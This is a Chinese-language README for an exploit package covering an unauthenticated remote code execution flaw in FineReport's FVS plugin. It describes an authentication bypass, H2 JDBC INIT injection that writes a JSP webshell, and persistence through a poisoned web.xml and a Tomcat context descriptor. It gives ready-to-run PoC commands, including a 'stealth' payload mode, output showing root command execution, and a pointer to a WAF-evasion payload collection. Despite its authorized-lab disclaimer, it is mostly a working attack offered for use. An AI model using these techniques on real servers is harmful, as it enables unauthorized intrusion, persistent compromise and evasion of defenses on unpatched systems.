# 帆软 FineReport FVS 插件未授权 RCE（fr-fvs-unauth-rce）

- **影响**：FineReport < 11.5.16（FVS/Duchamp 复用资源链路；实验基线 11.5.15 + wysiwyg 插件 4.13.0）
- **修复**：升级 FineReport 至 11.5.16（插件 4.15.0 加鉴权卫兵，同载荷对照已证失效）
- **定性**：未认证远程代码执行，命令以应用进程权限运行（实验容器内 uid=0）
- **情报**：已有公开通告与公开复现描述，均未放出 PoC；本包为独立复现

## 一个鉴权缺陷，两个 RCE 出口

```
?tplPath=reportlets 归一化为空 → 绕过登录校验（未授权调用上传/apply）
├── 出口一  props.name 注入 jdbc:h2 URL 的 INIT → CALL FILE_WRITE 任意路径/后缀/大小写
│    ├── 交互  poc-h2.py            写 JSP 到默认 context(ROOT) → GET ?c=<命令> 即时执行
│    └── 植入  poc-h2.py --implant  写毒 WEB-INF/web.xml + x.env(jspInit)
│                                    + Tomcat 上下文描述符(容器配置)
│                                    → autoDeploy 自动重载 → 部署时执行 jspInit
│                                    （出厂镜像实测：零重启、零触发请求）
└── 出口二  poc-attach.py            仅靠包内附件清单写毒 WEB-INF/web.xml + x.env(jspInit)
                                     → Tomcat 发现 web.xml 变了 → 自动重载并执行
                                     （应用需由 Tomcat 自己管理；官方 ops 镜像例外，见下）
```

"自动重载"的机制：Tomcat 的 `autoDeploy`（出厂默认开启）每隔约 10 秒扫描上下文描述符，
发现新增或变更就自动部署对应上下文；部署时读取（被投毒的）`WEB-INF/web.xml`，由 Jasper
编译 `jspInit` 并执行——即"容器检测到配置变更后重载，写入的代码随之被解析执行"。

附件路线靠的是 Tomcat 的另一条规则：由它自己管理的应用，`WEB-INF/web.xml` 一变就重载——
只覆盖这一个文件就够了。

## 三种用法与公开描述的对应

| 公开描述里的效果 | 本包对应 | 实测（出厂镜像） |
|---|---|---|
| 可控字段进入数据连接流程，连接层的危险参数拦截未生效，命令以应用进程权限执行，结果经 Web 路径回读 | `poc-h2.py`（交互）/ `--shape stealth` | ✓ 约 10 秒出结果 |
| 导入组件按包内清单写入文件，可写 WEB-INF 甚至覆盖容器配置；容器检测到配置变更后自动重载，代码被解析执行 | `poc-h2.py --implant` | ✓ 描述符写入 3 秒后自动部署，约 45 秒后执行；零重启、零触发请求 |
| 同上，但只靠附件层完成 | `poc-attach.py` | 应用由 Tomcat 管理时 ✓：写入后 5–8 秒触发重载，约 50–63 秒后执行；官方 ops 镜像的原样 `/webroot` 上只能植入（见"说明与边界"） |

## 文件

| 文件 | 内容 |
|---|---|
| `poc-h2.py` | 出口一。交互模式：上传→apply→触发→回读，5 种载荷形态（含 `--shape stealth`）；植入模式 `--implant`：三枪全自动，约 45 秒出结果。纯 Python3 标准库，零依赖 |
| `poc-attach.py` | 出口二。仅靠附件清单投毒 `web.xml`；应用由 Tomcat 管理时全自动（实测约 50–63 秒），官方 ops 镜像的原样 `/webroot` 上需重启或配合 `--implant` |
| `vulnerability-analysis.md` | 原理分析：鉴权缺陷、两个出口的反编译实证、H2 判决实验、重载触发实测、修复面 |
| `REPRODUCE.md` | 复现指南：环境、三种打法的命令与期望输出、pcap 导览、常见坑 |
| `pcaps/` | 三份实录流量：`h2-route.pcap`（交互）、`h2-implant-auto.pcap`（全自动植入）、`attach-route.pcap`（附件全自动） |
| `waf-variants.md` | 规避变体全集（字符级 + 结构级两层），每个含完整载荷原文与有效/死因，附检测建议 |

## 快速开始（仅限授权靶场）

```bash
# 交互模式：GET ?c= 参数化，即时执行
python3 poc-h2.py -t http://<靶场>:18081                       # 默认命令: id/hostname/date 落地并回读
python3 poc-h2.py -t http://<靶场>:18081 -c "id"
python3 poc-h2.py -t http://<靶场>:18081 --shape stealth       # 全隐身载荷形态

# 植入模式：全自动，容器自动重载后执行（零重启、零触发请求）
python3 poc-h2.py -t http://<靶场>:18081 --implant
python3 poc-h2.py -t http://<靶场>:18081 --implant -c "id"     # 命令在写入时固化

# 附件层：应用由 Tomcat 管理时全自动；官方 ops 镜像的原样 /webroot 上需先重启或配合 --implant
python3 poc-attach.py -t http://<靶场>:18081
```

## 实测输出（自建靶场）

交互模式：

```
[3] trigger -> 200  waitFor=0
[4] readback-> 200
----------------------------------------------
PWN-FVS-UNAUTH-RCE
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
2026年 11月 ...
----------------------------------------------
```

植入模式（期间容器未重启，也没有任何触发请求）：

```
[1] web.xml(投毒)   -> 200/200
[2] x.env(jspInit)  -> 200/200
[3] 容器描述符      -> 200/200   (/usr/local/tomcat/conf/Catalina/localhost/z.xml)
[4] 等待 autoDeploy 自动部署并执行(最长 200s, 实测 10~60s)...
    命令已自动执行(零重启, 零触发请求):
----------------------------------------------
PWN-H2-IMPLANT
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
----------------------------------------------
```

附件层（应用由 Tomcat 管理；期间容器未重启，也没有任何触发请求）：

```
[1] upload  -> 200  id=<uuid>
[2] apply   -> 200  {"applySuccess":true,...}
[3] 等待 Tomcat 自动重载并执行(最长 180s, 每 6s 探测回读文件)...
    命令已执行（无需任何触发请求）:
----------------------------------------------
PWN-ATTACH-LAYER-RCE
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
----------------------------------------------
```

## 说明与边界

- **路径假设**：PoC 默认按官方镜像布局（`/usr/local/tomcat`、`webapps/webroot`、默认 context 为 ROOT）。
  其它部署用 `--write-dir`（交互模式）和 `--tomcat-home`（植入模式）调整
- **自动重载依赖 `autoDeploy`**：这是 Tomcat 的出厂默认。若目标关掉了它，`--implant` 只完成植入，
  命令在下次重启/重部署时执行（`--no-desc` 可显式只植入不触发）
- **副作用**：植入模式部署的新上下文会在同一 JVM 内再启动一个 FR 实例（约 43 秒部署期、额外内存，
  日志里有报错栈）
- **附件层什么时候全自动**：Tomcat 对"由它自己管理"的应用（放在 `webapps/` 下自动部署，或由
  `conf/Catalina/localhost/` 描述符部署）会监听 `WEB-INF/web.xml`，一变就自动重载。实测应用由 Tomcat
  管理时，`poc-attach.py` 写入后 5–8 秒触发重载，约 50–63 秒后执行，零重启、零触发请求
- **官方 ops 镜像上附件层为什么不行**：它把 `/webroot` 直接写死在 `server.xml` 里、`appBase="none"`，
  Tomcat 不监听这个应用的 `web.xml`（开 `reloadable` 也只监听 classes/lib，均实测）。所以在这类部署上
  附件层只完成植入，要等重启；`poc-h2.py --implant` 多写一个上下文描述符，应用就转为 Tomcat 管理，
  于是全自动
- **JSP-Monitor**：本实验部署里 security.enhance 插件只盯 webroot，写进去的 `.jsp` 秒级被改名
  `.blocked`。所以交互模式写 ROOT，植入模式藏在 WEB-INF 且后缀为 `.env`。监控范围取决于目标配置
- **FR 功能不受影响**：FR 本体没有自带 `web.xml`（servlet 走注解注册），新写入的不含
  `metadata-complete`，重启后登录页 200
- **前置条件**：目标装有 FVS 插件即可（H2 为插件自带，触发开关在攻击者上传的包里，
  零服务端配置、零外部数据库）。两个 PoC 的命令都经目标机的 `/bin/sh` 执行——目标是
  Linux 官方镜像时天然满足；Windows 部署需自行改命令形式。FR 进程需对 Tomcat 目录有
  写权限（官方镜像以 root 运行，天然满足）
- **还原靶场**：删除 `WEB-INF/web.xml`、`WEB-INF/x.env`、`conf/Catalina/localhost/z.xml`
  （描述符删除后 Tomcat 会在数秒内自动卸载该上下文）、`ROOT/*.jsp`、`webroot/*.txt`

## 免责

仅用于授权安全测试、自有靶场复现与防御研究，禁止对生产环境或他人资产使用。
本漏洞已由厂商修复并公开通告；全部实验在自建靶场完成，不含真实目标信息或凭据。
